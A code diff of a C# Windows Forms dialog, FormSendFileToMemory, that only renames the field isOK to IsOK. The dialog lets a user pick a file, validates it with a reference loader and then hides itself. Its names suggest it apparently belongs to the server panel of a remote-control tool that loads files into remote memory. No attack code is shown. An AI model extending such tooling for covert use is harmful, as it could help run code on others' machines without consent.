@@ -15,7 +15,7 @@ namespace Server
 {
     public partial class FormSendFileToMemory : Form
     {
-        public bool isOK = false;
+        public bool IsOK = false;
         public FormSendFileToMemory()
         {
             InitializeComponent();
@@ -54,19 +54,19 @@ namespace Server
                 toolStripStatusLabel1.Text = Path.GetFileName(O.FileName);
                 toolStripStatusLabel1.Tag = O.FileName;
                 toolStripStatusLabel1.ForeColor = Color.Green;
-                isOK = true;
+                IsOK = true;
                 if (comboBox1.SelectedIndex == 0)
                 {
                     try
                     {
                         new ReferenceLoader().AppDomainSetup(O.FileName);
-                        isOK = true;
+                        IsOK = true;
                     }
                     catch
                     {
                         toolStripStatusLabel1.ForeColor = Color.Red;
                         toolStripStatusLabel1.Text += " Invalid!";
-                        isOK = false;
+                        IsOK = false;
                     }
                 }
             }
@@ -74,20 +74,20 @@ namespace Server
             {
                 toolStripStatusLabel1.Text = "";
                 toolStripStatusLabel1.ForeColor = Color.Black;
-                isOK = true;
+                IsOK = true;
             }
 
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
-            if (isOK)
+            if (IsOK)
                 this.Hide();
         }
 
         private void Button3_Click(object sender, EventArgs e)
         {
-            isOK = false;
+            IsOK = false;
             this.Hide();
         }
     }
